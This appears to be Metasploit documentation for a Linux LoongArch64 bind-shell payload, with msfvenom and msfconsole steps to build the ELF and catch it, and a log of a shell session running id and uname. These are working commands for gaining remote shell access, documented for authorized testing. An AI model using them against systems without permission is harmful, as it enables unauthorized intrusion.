## Vulnerable Application

This inline Linux LoongArch64 payload listens for an IPv4 connection, redirects
standard input, output, and error to the socket, and executes `/bin/sh`.
It supplies an argument array compatible with BusyBox shells.
No vulnerable application is required; the payload must be executed on Linux LoongArch64.

## Verification Steps

1. Prepare a Linux LoongArch64 system with `/bin/sh` and an inbound reachable port.
1. Generate an ELF: `./msfvenom -p linux/loongarch64/shell_bind_tcp LPORT=4444 VERBOSE=true -f elf -o shell.elf`
1. Start `./msfconsole` and select `use exploit/multi/handler`.
1. Set `PAYLOAD` to `linux/loongarch64/shell_bind_tcp`.
1. Set `RHOST` to the test system and `LPORT` to the value used during generation.
1. Set `VERBOSE` to `true` and run the handler.
1. Copy `shell.elf` to the test system, run `chmod +x shell.elf`, and execute it.
1. In the resulting shell, run `id` and `uname -a`.

## Options

No specific options

## Scenarios

```msf
$ ./msfvenom -p linux/loongarch64/shell_bind_tcp LPORT=50002 VERBOSE=true -f elf -o /tmp/pr21954-inline-bind.elf
Payload size: 212 bytes
Final size of elf file: 332 bytes
Saved as: /tmp/pr21954-inline-bind.elf
msfuser@morefinels64:/tmp$ chmod +x pr21954-inline-bind.elf
msfuser@morefinels64:/tmp$ ./pr21954-inline-bind.elf &
PAYLOAD => linux/loongarch64/shell_bind_tcp
RHOST => 10.5.132.181
LPORT => 50002
ExitOnSession => false
VERBOSE => true
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(multi/handler) >
[*] Started bind TCP handler against 10.5.132.181:50002
[*] Command shell session 1 opened (10.5.135.210:43435 -> 10.5.132.181:50002) at 2026-10-20 15:29:06 -0500
sessions -i 1
[*] Starting interaction with 1...

uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),114(bluetooth),116(scanner),117(lpadmin)
Linux morefinels64 4.19.0-19-loongson-3 #1 SMP 4.19.190.8.26 Wed Oct 15 02:40:20 UTC 2025 loongarch64 loongarch64 loongarch64 GNU/Linux
[*] 10.5.132.181 - Command shell session 1 closed.
msf exploit(multi/handler) > jobs -K
Stopping all jobs...

```
